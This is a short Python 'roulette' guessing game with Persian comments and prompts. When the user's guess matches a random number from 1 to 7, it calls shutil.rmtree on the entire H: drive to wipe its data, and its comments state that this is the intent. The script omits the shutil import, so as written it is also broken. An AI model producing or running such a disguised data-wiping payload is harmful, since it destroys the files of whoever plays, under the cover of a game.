import random

def roulette():
    # تولید عدد رندوم بین ۱ تا ۷
    number = random.randint(1, 7)

    # دریافت عدد ورودی از کاربر
    number_from_user = int(input("عددی بین ۱ تا ۷ وارد کنید: "))

    # بررسی اینکه عدد رندوم با عدد ورودی برابر است یا خیر
    if number == number_from_user:
        # اگر برابر است، کل اطلاعات سیستم را پاک می کند
        print("شما بازنده شدید! کل اطلاعات سیستم شما پاک شد.")
        shutil.rmtree("H:\\")
    else:
        # اگر برابر نیست، به کاربر اطلاع می دهد که زنده مانده است
        print("شما برنده شدید! زنده ماندید.")

if __name__ == "__main__":
    roulette()
